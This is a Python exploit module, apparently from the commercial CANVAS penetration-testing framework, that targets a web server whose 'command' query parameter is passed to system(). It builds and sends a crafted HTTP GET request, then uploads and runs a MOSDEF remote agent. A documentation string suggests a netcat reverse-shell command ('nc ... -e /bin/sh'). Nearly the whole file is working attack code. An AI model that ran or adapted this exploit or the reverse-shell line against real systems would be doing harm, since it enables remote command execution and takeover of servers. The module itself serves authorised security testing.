#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit

NAME="Test CLE"
DESCRIPTION="Poor input validation allows remote users to call system(command)"
DOCUMENTATION={}
DOCUMENTATION["Notes"]="Try using nc <localhost> <localport> -e /bin/sh as your command and having a nc -vlp <localport>"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
"""

CHANGELOG="""

"""
import urllib

from ExploitTypes.CommandLineExecuter import CommandExploit

class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)
        self.neededListenerTypes=self.cle_neededListenerTypes
        self.port=80
        self.host=""
        self.shellcode="\xcc" * 298
        self.badstring="\x00"
        self.setVersions()
        self.version=1
        self.done=0
        self.name=NAME    
        self.basepath="/"
        self.command=None #none by default. We want to try to automatically load MOSDEF
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.basepath=self.argsDict.get("basepath",self.basepath)
        self.command=self.argsDict.get("command",self.command)
        self.ssl=self.argsDict.get("ssl",self.ssl)
        self.getargs_cle() #always call this
        return 
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=["CLE Test Against Web Server"]

    def test(self):
        """
        Quicky banner check
        """
        self.getargs()
        self.get_os()
        if self.target_os!=None:
            self.version=1
            return 1
        self.log("Was unable to determine target os!")
        return 0
    
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            #In order to correctly set up our attack string we first need to 
            #determine the OS we are targeting as much as possible
            ret=self.test()
            if not ret:
                self.log("Testing didn't find target as vulnerable")
                return 0

        #next we upload a MOSDEF executable and execute it
        self.upload_and_execute()

        ret=0
        if self.ISucceeded():
            self.log("Got a new MOSDEF up and running!")
            ret=1
        
        return ret
    
    def run_blind_command(self, command):
        """
        Runs the blind command, returns True if we think we are successful
        False otherwise
        """
        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit(command)
        ret=0
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
            self.websend(s,sploitstring)
            self.log("Sent attack")
        except:
            return False 
        return True
    
    
        
    def makesploit(self,command):
        """
        Construct the attack
        GET /?command=COMMAND
        Host: localhost
        User-Agent: bob
        """

        sploitstring=""
        self.log("Command: %s"%command)
        command=urllib.quote_plus(command)
        sploitstring="GET /?command=%s HTTP/1.0\r\nHost: localhost\r\nUser-Agent: bob\r\n\r\n"%(command)  
        self.log("Sending: %s"%sploitstring)
        return sploitstring
    

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
